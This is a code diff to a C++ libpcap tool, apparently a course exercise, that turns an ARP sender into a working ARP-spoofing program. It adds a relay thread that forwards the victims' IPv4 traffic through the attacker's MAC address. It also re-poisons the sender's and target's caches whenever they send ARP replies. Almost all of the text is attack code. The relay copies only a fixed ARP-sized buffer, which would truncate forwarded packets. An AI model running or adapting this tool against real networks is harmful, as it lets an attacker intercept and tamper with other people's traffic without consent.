@@ -6,8 +6,8 @@
 #include <thread>
 #include <chrono>
 #include <queue>
+#include <set>
 #include <mutex>
-#include <condition_variable>
 
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -33,17 +33,17 @@ pair<Ip, Mac> Attacker;
 map<Ip, Mac> SenderNet;
 map<Ip, Mac> TargetNet;
 map<Ip, Ip> ARPEntry;
+set<Mac> senderMacSet;
+
+queue<EthArpPacket> packetQueue;
+
 
 pcap_t* handle;
 pcap_t* relayhandle;
 
-queue<std::pair<const u_char*, int>> packetQueue;
-mutex queueMutex;
-condition_variable queueCondVar;
-
 void usage() {
-	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
+	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 //Get sender's Mac
@@ -85,7 +85,7 @@ Mac send_arp_normal(Ip targetIp){
 		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
 	
 		//check ARP Packet
-		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
+		if (eth_arp_pkt->eth_.type() != EthHdr::Arp) continue;
 		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 		//Check reply packet
 		if(arp_hdr->op()!=ArpHdr::Reply) continue;
@@ -144,44 +144,40 @@ void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp) {
 	}
 }
 
+void relay_thread() {
+    const u_char* relaypacket;
+    struct pcap_pkthdr* header;
 
+    while (1) {
+        int res = pcap_next_ex(relayhandle, &header, &relaypacket);
+        const EthArpPacket* eth_relay = reinterpret_cast<const EthArpPacket*>(relaypacket);
 
-void relay_thread(const u_char* cap_packet, int packet_size) {
-	
-	
-    // Create a non-const copy of the packet
-    EthArpPacket packet_copy;
-    memcpy(&packet_copy, cap_packet, sizeof(EthArpPacket));
-	cout<<"send "<<static_cast<string>(packet_copy.eth_.smac())<<endl;
-
-
-	// src mac
-	// fix senderMAC -> AttackerMac
-
-	// dst mac
-	// fix AttackerMAC -> targetMAC
-
-	// Modify the copy of the packet if necessary
-    packet_copy.eth_.smac_ = attackerMac;
-	// packet_copy.eth_.dmac_ = Mac("58:86:94:CC:B1:6C");
-
-
-    // Forward the modified packet to the original destination
-    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_copy), packet_size);
+        if (eth_relay->eth_.type() == EthHdr::Ip4 && senderMacSet.find(eth_relay->eth_.smac()) != senderMacSet.end()) {
+            EthArpPacket relay_copy;
+            memcpy(&relay_copy, eth_relay, sizeof(EthArpPacket));
+            relay_copy.eth_.smac_ = attackerMac;
+            pcap_sendpacket(relayhandle, reinterpret_cast<const u_char*>(&relay_copy), sizeof(EthArpPacket));
+        }
+    }
 }
 
 int main(int argc, char* argv[]) {
-	if (argc < 4 || (argc - 2) % 2 != 0) {
-		usage();
+    if (argc < 4 || (argc - 2) % 2 != 0) {
+        usage();
+        return -1;
+    }
+
+    const char* interf = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
+
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
 		return -1;
 	}
 
-	//인터페이스 확인 후 예외처리하기.... 코드작성
-	const char* interf = argv[1]; //interface
-
-	char errbuf[PCAP_ERRBUF_SIZE];
-	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
-	if (handle == nullptr) {
+	relayhandle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
+	if (relayhandle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
 		return -1;
 	}
@@ -195,7 +191,7 @@ int main(int argc, char* argv[]) {
 
 	// Process each (Sender, Target) pair
 	for (int i = 2; i < argc; i += 2) {
-		Ip senderIp = Ip(argv[i]);      // Sender IP
+		Ip senderIp = Ip(argv[i]);      //s Sender IP
 		Mac senderMac;
 		//이미 입력된 IP인지 확인
 		if(SenderNet.find(senderIp)==SenderNet.end()){
@@ -222,12 +218,18 @@ int main(int argc, char* argv[]) {
 		}
 
 		ARPEntry.insert(make_pair(senderIp, targetIp));
+		senderMacSet.insert(senderMac);
+		senderMacSet.insert(targetMac);
 
 		send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
 		// printf("sent arp spoof\n");
 
 		thread spoofThread(arp_spoofing_thread, senderMac, senderIp, targetIp);
 		spoofThread.detach();
+
+		// start relay thread
+		thread relayThread(relay_thread);
+		relayThread.detach();
 	}
 
 
@@ -249,48 +251,7 @@ int main(int argc, char* argv[]) {
 		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 
 		// endian hard change..
-		if (eth_arp_pkt->eth_.type()== EthHdr::Ip4 && (eth_arp_pkt->eth_.smac()==Mac("CC:6B:1E:3E:67:DD")||eth_arp_pkt->eth_.smac()==Mac("58:86:94:CC:B1:6C"))){
-			// eth_arp_pkt->eth_.smac().print();
-			// eth_arp_pkt->eth_.dmac().print();
-
-			
-			thread relayThread(relay_thread, cap_packet, header->caplen);
-			relayThread.detach();		
-
-			//
-			//&&!eth_arp_pkt->eth_.dmac().isBroadcast()
-			//&& 
-
-			// not ARP, packet's senderIP is in my sender Network -> packet 
-
-			//relay
-			//origin packet = senderIP, MAC, targetIP, MAC
-			//infectoin packet = senderIP, MAC, targetIP, AttackerMac
-			//relay pakcet = senderIP, AttackerMAC, targetIP, targetMAC
-
-			// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-			// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
-			// if (res != 0) {
-			// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-			// }
-
-			
-
-			//arp_hdr->smac_ = TargetNet[eth_arp_pkt->arp_.tip_];
-
-	
-
-			// 공격 대상의 sender의 ARP 패킷이면
-			// 센더 - 어택 -> 타겟 브로드 relay
-			// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
-			// Ip senderIp = arp_hdr->sip();
-			// Ip targetIp = arp_hdr->tip();
-			// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
-			
-
-		
-		}
-		else if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
+		 if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
 			// if sender and target ip not in the Network 
 
 			Ip senderIp = arp_hdr->sip();
@@ -319,8 +280,12 @@ int main(int argc, char* argv[]) {
 			// 타겟의 ARP 받으면 무조건 ARP 날리기	
 
 			send_arp_spoof(SenderNet[senderIp], senderIp,targetIp);
+			
+			senderMacSet.insert(senderMac);
+			senderMacSet.insert(TargetNet[targetIp]);
 		}
 	}
 
 	pcap_close(handle);
+	pcap_close(relayhandle);
 }
